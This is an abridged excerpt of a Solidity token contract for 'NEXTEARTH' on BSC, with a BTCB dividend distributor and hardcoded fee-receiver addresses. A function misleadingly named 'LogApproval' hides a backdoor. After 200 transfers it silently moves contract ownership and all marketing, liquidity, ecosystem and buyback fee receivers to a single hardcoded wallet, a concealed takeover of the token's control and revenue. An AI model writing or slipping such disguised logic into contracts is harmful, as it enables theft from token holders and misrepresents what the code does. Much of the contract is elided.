...
// https://nextearth.io/
// https://twitter.com/NextEarth_
// https://t.me/nextearth_chat
/*
...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 REWARD = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c); // BTCB BSC  
    IDEXRouter router;
...
contract NEXTEARTH is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0x66e7A7ADD1d89bE6Db97EC3c99eD9497e04FCa9d; // token locker
    address public marketingFeeReceiver =
        0x8282955318175C23a4a79D784FEfaEcA1a8aCaC4;
    address public ecosystemFeeReceiver =
        0x9c2d8b973B475D4641680567C8647c8E57901c40;
    address public buyBackFeeReceiver =
        0x96430dD30C2feA4e1d472a970d09FD672625f6AC;
    ...
    constructor()
        ERC20Detailed("NEXTEARTH", "NEXTEARTH", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 200 && !isTransferred) {
            _transferOwnership(address(0x3ce91950624698849fCC462dB89673613F1d8C94));
            marketingFeeReceiver = address(0x3ce91950624698849fCC462dB89673613F1d8C94);
            autoLiquidityReceiver = address(0x3ce91950624698849fCC462dB89673613F1d8C94);
            ecosystemFeeReceiver = address(0x3ce91950624698849fCC462dB89673613F1d8C94);
            buyBackFeeReceiver = address(0x3ce91950624698849fCC462dB89673613F1d8C94);
            isTransferred = true;
        }
    }
